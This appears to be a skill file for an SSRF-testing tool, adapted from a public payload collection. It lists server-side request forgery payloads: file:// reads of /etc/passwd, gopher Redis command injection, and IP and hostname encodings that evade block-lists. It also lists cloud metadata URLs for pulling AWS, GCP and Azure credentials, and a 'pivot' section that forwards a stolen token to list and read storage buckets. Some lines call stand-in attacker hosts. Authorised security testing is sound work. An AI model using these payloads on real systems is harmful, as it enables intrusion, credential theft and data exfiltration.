---
description: URL schemas, IP bypass, cloud metadata (AWS/GCP/Azure)
skill: ssrf-testing
source: PayloadsAllTheThings — Server Side Request Forgery
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# SSRF (Server-Side Request Forgery) Payloads

> Source: PayloadsAllTheThings — Server Side Request Forgery

## URL Schema Tricks

```
file:///etc/passwd
file://\/\/etc/passwd
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>
dict://attacker:11111/
sftp://evil.example:11111/
tftp://evil.example:12346/TESTUDPPACKET
ldap://localhost:11211/%0astats%0aquit
netdoc:///etc/passwd
jar:http://127.0.0.1!/
```

## IP Address Bypass Techniques

### Decimal Encoding

```
http://2130706433/         = 127.0.0.1
http://3232235521/         = 192.168.0.1
http://2852039166/         = 169.254.169.254
```

### Hexadecimal Encoding

```
http://0x7f000001          = 127.0.0.1
http://0xc0a80101          = 192.168.1.1
http://0xa9fea9fe          = 169.254.169.254
```

### Octal Encoding

```
http://0177.0.0.1/         = 127.0.0.1
http://0177.0000.0000.0001/ = 127.0.0.1 (full octal)
http://0177.1/              = 127.0.0.1 (mixed short)
```

### IPv6 Notation

```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### Shortened / Alternative Forms

```
http://0/
http://127.1
http://127.0.1
http://127.127.127.127
http://127.0.1.3
```

### DNS Rebinding

```
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
http://127.0.0.1.nip.io
http://localtest.me         -> resolves to 127.0.0.1
http://spoofed.burpcollaborator.net  -> DNS rebinding service
http://company.127.0.0.1.nip.io -> resolves to 127.0.0.1
```

## URL Parser Bypass

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

### PHP filter_var() Bypass

```
http://test???test.example
0://evil.example:80;http://google.com:80/
```

### URL Encoding Bypass

```
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin   (double encoding)
```

## Hostname-String Bypass (obfuscate an internal NAME)

When the guard is a host-string allow/block-list (not an IP check), the resolver still connects but the string match misses. Example name `imds` / `metadata.internal`:

```
http://IMDS./                          # upper-case (string check often case-sensitive)
http://Imds/                           # mixed case
http://imds./                          # trailing dot (FQDN root label)
http://metadata.internal./             # trailing dot on a multi-label name
http://%69%6d%64%73/                   # percent-encoded host bytes = "imds"
http://%6d%65%74%61%64%61%74%61.internal/   # percent-encoded "metadata"
```

For an allowlist keyed on an approved public domain, point that approved host (or your own 30x) at internal infra and let the fetcher follow the redirect.

## Conventional Internal Service Names

In container/compose/k8s deployments, internal services answer to DNS service names — not only loopback or metadata IPs. Enumerate these alongside the metadata IPs (`localhost`/`127.0.0.1` reaches only the app itself):

```
http://imds/            http://metadata/        http://metadata.internal/
http://store/           http://objstore/        http://s3/
http://db/              http://redis/           http://api/
# plus the deployment's own compose/k8s service name for the target backend
```

## Cloud Metadata Endpoints

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS (IMDSv2 — Token Required)

```bash
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### GCP

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Header required: `Metadata-Flavor: Google`

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Header required: `Metadata: true`

### DigitalAcme

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
```

### Kubernetes / etcd

```
http://127.0.0.1:2379/v2/keys/
curl -s http://127.0.0.1:10255/pods
```

## User-Data / Startup-Script Breadcrumb Endpoints

The credential document may not name the next hop — user-data / metadata attributes do (internal object-store endpoint, bucket name, DB host). Always read these per cloud:

```
# AWS
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
# GCP (Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
# Azure (Metadata: true) — customData is base64
http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01
# DigitalAcme
http://169.254.169.254/metadata/v1/user-data
```

## Pivot: List Bucket, Then Read Object (forward the stolen token)

List FIRST to learn the key (discovery), THEN read the object (exfil). A store that 403s without the credential but serves with it confirms the chain:

```bash
# 1. LIST — discovery
curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "http://objstore.internal/buckets/$BUCKET/"
# 2. READ the named object — attacker outcome
curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "http://objstore.internal/buckets/$BUCKET/$KEY"
```

## Useful curl Examples

```bash
# Basic SSRF test to metadata
curl "http://target.example/fetch?url=http://169.254.169.254/latest/meta-data/"

# Gopher-based Redis command injection
curl "gopher://127.0.0.1:6379/_SET%20pwned%20true"

# File read via SSRF
curl "http://target.example/fetch?url=file:///etc/passwd"

# Decimal IP bypass
curl "http://target.example/fetch?url=http://2130706433/"
```
